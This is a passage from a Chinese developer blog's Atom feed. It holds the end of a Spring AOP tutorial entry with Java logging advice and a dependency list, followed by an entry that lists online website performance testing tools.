e.getMessage());</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@AfterReturning(value = &quot;point()&quot;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afteReturningAdvice</span><span class="params">(JoinPoint joinPoint)</span> </span>&#123;</span><br><span class="line">    logger.info(<span class="string">&quot;======= after returning advice &#123;&#125; ======&quot;</span>, joinPoint.getSignature().getName());</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/spring.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;此段内容说明如何使用spring aop，并通过一个函数耗时统计切面demo来讲述使用具体步骤。&lt;/p&gt;
&lt;h2 id=&quot;一、创建maven工程&quot;&gt;&lt;a href=&quot;#一、创建maven工程&quot; class=&quot;headerlink&quot; title=&quot;一、创建maven工程&quot;&gt;&lt;/a&gt;一、创建maven工程&lt;/h2&gt;&lt;p&gt;通过STS创建一个maven工程martinye-demo-spring-support。&lt;/p&gt;
&lt;p&gt;修改pom.xml文件，添加项目相关依赖如下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;servlet&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;javax.servlet-api&lt;/li&gt;
&lt;li&gt;jstl&lt;/li&gt;
&lt;li&gt;standard&lt;/li&gt;
&lt;li&gt;jsp-api&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;spring&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;spring-webmvc&lt;/li&gt;
&lt;li&gt;aspectjweaver&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;log&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;slf4j-api&lt;/li&gt;
&lt;li&gt;slf4j-log4j12&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;utils&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;commons-lang3&lt;/li&gt;
&lt;li&gt;commons-collections&lt;/li&gt;
&lt;li&gt;commons-io&lt;/li&gt;
&lt;li&gt;guava&lt;/li&gt;
&lt;li&gt;fastjson&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;test&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;junit&lt;/li&gt;
&lt;li&gt;spring-test&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
    <category term="实践" scheme="http://yeshaoting.cn/tags/%E5%AE%9E%E8%B7%B5/"/>
    
    <category term="spring" scheme="http://yeshaoting.cn/tags/spring/"/>
    
    <category term="aop" scheme="http://yeshaoting.cn/tags/aop/"/>
    
  </entry>
  
  <entry>
    <title>在线网站性能测试工具</title>
    <link href="http://yeshaoting.cn/article/tool/%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    <id>http://yeshaoting.cn/article/tool/%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="推荐工具"><a href="#推荐工具" class="headerlink" title="推荐工具"></a>推荐工具</h2><p><a href="http://gtmetrix.com/">GT Matrix</a><br><a href="http://www.oschina.net/p/show-slow">Show Slow</a><br><a href="https://developers.google.com/speed/pagespeed/insights/">Google PageSpeed Insights</a></p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="http://www.daqianduan.com/3962.html">推荐10个免费在线测试网页性能工具</a><br><a href="http://segmentfault.com/a/1190000000447171">12 个最好的免费网站速度和性能测试工具</a><br><a href="http://www.oschina.net/news/21033/12-free-online-tools-for-website-testing">12 个免费在线的 Web 网站性能测试工具</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;推荐工具&quot;&gt;&lt;a href=&quot;#推荐工具&quot; class=&quot;headerlink&quot; title=&quot;推荐工具&quot;&gt;&lt;/a&gt;推荐工具&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://gtmetrix.com/&quot;&gt;GT Matrix&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http:</summary>
      
    
    
    
    <category term="工具软件" scheme="http://yeshaoting.cn/categories/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="性能测试" scheme="http://yeshaoting.cn/tags/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
